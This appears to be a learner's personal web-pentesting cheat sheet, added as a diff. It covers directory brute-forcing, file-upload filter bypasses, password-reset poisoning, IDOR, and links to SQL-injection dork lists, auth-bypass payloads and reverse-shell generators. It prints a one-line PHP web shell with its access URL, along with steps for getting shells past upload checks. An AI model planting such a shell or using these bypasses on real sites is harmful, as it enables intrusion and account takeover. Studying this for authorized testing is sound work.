@@ -1,0 +1,164 @@
+Common Thing:
+dirsearh -u <link> -r 3
+dirsearh -u <link> -w <wordlist>
+For Seclist : /usr/share/seclists
+For Wordlist :  /usr/share/wordlists
+Payload all the things : https://swisskyrepo.github.io/PayloadsAllTheThings/
+
+File Upload Vulnerabilities:
+
+* Common PHP Shell:
+▶ Open a php file <?php system($_GET['cmd']); ?>
+▶ exploit : /uploads/shell.php?cmd=
+
+
+* File Uploading Extention Check and uploading and directory Searching:
+▶ Target your Target and find the uploading option if you find thats great
+▶ Then try to upload image file and intercept it with burp and save request as a txt file  filename="abc.FUZZ" Content-Type: image/jpeg
+▶ ffuf -request req.txt -request-proto http -w /SecLists/Fuzzing/extentions-most-common.fuzz.txt
+▶ ffuf -request req.txt -request-proto http -w /SecLists/Fuzzing/extentions-most-common.fuzz.txt ms <size>
+▶ if You find that any kind of file uploader try to file upload and then Open in New tab.
+▶ And then try to Directory Searching by dirsearch/gobuster/wfuzz/Dirb
+
+* Tips:
+▶ if you find any kind of js file try to remove it from burp . then you may upload php file
+▶ Change File Type and Finding the Correct FIletype via burp and ffuf
+▶ Add pic/jpg/png/gif file signatures in 1st line of the file
+▶ Add Magic Byte in 1st line of the file
+▶ Find the real content type is : image/jpg, image/png, text/css, application/x-php more is \seclists\Miscellaneous\web\content-type.txt
+▶ Intercept page request and check MIME. Change shell.jpg to shell.php and content type image/jpeg to image/x-php
+▶ If you change file type try to change also content type 
+
+* Directory Search
+▶ dirsearch -u <link> -r 3
+▶ wfuzz -c -W /usr/share/wfuzz/wordlist/dir/common.txt --hc 400,404,403 http://192.168.1.5/dvwa/FUZZ
+▶ dirb http://192.168.1.5/dvwa
+▶ gobuster dir -u <ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+▶ gobuster dir -u wgel.thm -w /usr/share/wordlists/dirb/common.txt
+
+Note: Recall Cyber 360 Youtube_merged.pdf and File Upload Vulnerabilities.pdf those files
+
+
+Shell Uploading:
+
+Overwriting existing files on a server:
+▶ Find out upload path for uplaoding the your shell
+▶ Check source code properly
+▶ Change file name according to source code
+▶ upload the file
+
+Method:
+▶ First try to recon: 
+	nmap -sV -A -F -Pn <ip>
+	nmap -A -F <ip>
+	nmap -sV -p http <ip>
+	nmap -sV <ip>
+	rustscan -a <ip> -r 0-65535 -- -sCV -Pn
+	rustscan -a <ip> -r 0-65535 --ulimit 5000 -- -sCV -Pn 
+▶ Use directory search
+▶ take php reverse shell.php file and change ip [check your Ip via ifconfig]and port number and listenting nc lvnp <ip>
+
+* Filter Upload file for Protect uploading shell:
+▶ EXtention Validation
+▶ File Type Filtering : MIME Validation, Magic Number Validation
+▶ File length Filtering
+▶ File Name Filtering
+▶ File Content Filtering
+
+* Bypassing CLient-Side FIltering:
+▶ Get all basic Information(Language, path, source code, file extention)
+▶ Delete js code using Burp intercept then upload your shell
+▶ Edit Burp sutie User intercept and remove ^js$|
+▶ Intercept page request and check MIME. Change shell.jpg to shell.php and content type image/jpeg to image/x-php
+
+* Bypassing Server-Side FIltering:
+▶ Get all basic Information(Language, path, source code, file extention)
+▶ Uploading Target files and check alert message and then upload target file according to alert message like shell.png.php or shell.png.php
+▶ Check what extention is allow is BurpSuite intruder(php, pht, phps, php1, pht2, php3, php4, php5) then upload allow extention file
+▶ Intercept page request and check MIME. Change shell.jpg to shell.php and content type image/jpeg to image/x-php
+▶ Add Magic Byte in 1st line
+
+
+HTTP Host Header Attack:
+
+Common Http Protocol:
+
+FTP (20, 21)
+SSH (22)
+SMB (139, 137, 445)
+DNS (53)
+HTTP / HTTPS (443, 80, 8080, 8443)
+Telnet (23)
+SMTP (25)
+TFTP (69)
+Database (1433,1434,3306)
+RDP(3389)
+
+Http Methods:
+GET : The GET method requests a representation of the specified resource. Requests using GET should only retrieve data.
+HEAD : The HEAD method asks for a response identical to a GET request, but without the response body.
+POST : The POST method submits an entity to the specified resource, often causing a change in state or side effects on the server.
+PUT : The PUT method replaces all current representations of the target resource with the request payload.
+DELETE : The DELETE method deletes the specified resource.
+CONNECT : The CONNECT method establishes a tunnel to the server identified by the target resource.
+OPTIONS : The OPTIONS method describes the communication options for the target resource.
+TRACE : The TRACE method performs a message loop-back test along the path to the target resource.
+PATCH : The PATCH method applies partial modifications to a resource.
+
+For More : X-Content Type Options| MDN
+Encoding Schemes : URL Encoding, Base64, Html Encoding
+
+Password Reset Poisoning:
+▶ Click on "Forget your Password" and follow instruction
+▶ Analyze reset pasword link and check functionally of link
+▶ According to analysis result, try to find out vulnerability and exploit the target
+▶ In this demo, we see that the reset link share token for change password, if we get other users password reset token via this process we can take over those users account
+▶ For this, at first need to find username using previous process
+▶ If we get target user token for reset password we can use it for take over this account
+▶ Now go to previous user reset password path, then remove previous user token by target user token
+▶ If all are well, Bhoom!!! then reset password and login target user account
+
+--IDOR--
+
+* Insecure Direct Object Reference
+* Change value of Parameter
+Exaample:
+	https://example.com/bank?account_number=1234
+
+Burp Tools : Authz, AuthMatrix, Authorize
+
+Source:
+https://github.com/daffainfo/AllAboutBugBounty/blob/master/Insecure%20Direct%20Object%20References.md
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
+https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Direct%20Object%20References/#hashed-parameter
+
+nmap -sV <ip>
+
+SQLI Dork:
+
+https://github.com/rootac355/SQL-injection-dorks-list/blob/master/google%20dorks%20for%20sql%20injection.txt
+https://github.com/NoThrowForwardIt/SQLi-Dork-Repository/blob/master/shopping.txt
+https://github.com/ShivamRai2003/SQL-Injection-Google-Dork-List/blob/main/SQL-Injection-Dork%20List
+https://github.com/ShivamRai2003/SQL-Injection-Google-Dork-List/blob/main/SQL-Injection-Dork%20List
+https://github.com/Karanxa/Bug-Bounty-Wordlists/blob/main/sqli-google-dorks.txt
+https://gist.github.com/zhnlk/f01775e3bda2a0a1b5ac15f5a4feccc5
+https://github.com/Ishanoshada/GDorks/tree/main/SQLi
+
+
+Auth Bypass Payload:
+https://gist.github.com/spenkk/2cd2f7eeb9cac92dd550855e522c558f
+https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt
+https://github.com/CyberM0nster/SQL-Injection-Payload-List-/blob/master/SQL%20Injection%20Auth%20Bypass%20Payloads
+https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/login-bypass/sql-login-bypass.md
+https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/sql-injection/sql-injection-authentication-bypass.txt
+
+
+Reverse Shell Online:
+https://www.revshells.com/
+https://tex2e.github.io/reverse-shell-generator/index.html
+https://weibell.github.io/reverse-shell-generator/
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+
+
+
